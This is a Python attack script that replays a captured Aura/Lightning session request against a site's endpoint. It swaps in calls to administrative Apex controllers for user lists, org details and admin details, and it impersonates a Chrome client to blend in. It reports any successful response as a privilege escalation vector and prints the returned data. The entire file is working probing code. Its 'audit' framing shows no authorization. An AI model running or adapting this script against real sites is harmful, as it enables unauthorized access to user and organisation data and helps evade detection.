import json
from curl_cffi import requests
import urllib.parse

print("[*] Loading captured request structure for privilege escalation testing...")
with open("captured_feed_request.json", "r") as f:
    base_req = json.load(f)

url = base_req["url"]
headers = base_req["headers"]
original_post_data = base_req["post_data"]
parsed_data = dict(urllib.parse.parse_qsl(original_post_data))

# Test controllers associated with user management and privilege checking
escalation_targets = [
    "apex://UserManagementController/ACTION$getUsers",
    "apex://CommunityAdministrationController/ACTION$getOrgDetails",
    "apex://ProfileController/ACTION$getAdminDetails",
    "apex://SecurityController/ACTION$checkAccess"
]

session = requests.Session()
print(f"[*] Dispatching privilege escalation vectors against {len(escalation_targets)} administrative targets...")

for i, descriptor in enumerate(escalation_targets):
    message_obj = {
        "actions": [
            {
                "id": f"55{i};a",
                "descriptor": descriptor,
                "callingDescriptor": "UNKNOWN",
                "params": {}
            }
        ]
    }
    
    parsed_data["message"] = json.dumps(message_obj)
    new_post_data = urllib.parse.urlencode(parsed_data)
    
    try:
        res = session.post(url, headers=headers, data=new_post_data, impersonate="chrome120", timeout=5)
        print(f"    [+] Target {descriptor} -> Status: {res.status_code} | Length: {len(res.text)}")
        if '"state":"SUCCESS"' in res.text:
            print(f"    [🔥] SUCCESSFUL PRIVILEGE ESCALATION VECTOR IDENTIFIED: {descriptor}")
            print(f"    [🔥] Response snippet: {res.text[:400]}")
    except Exception as e:
        print(f"    [-] Error: {e}")

print("[+] Privilege escalation audit complete.")

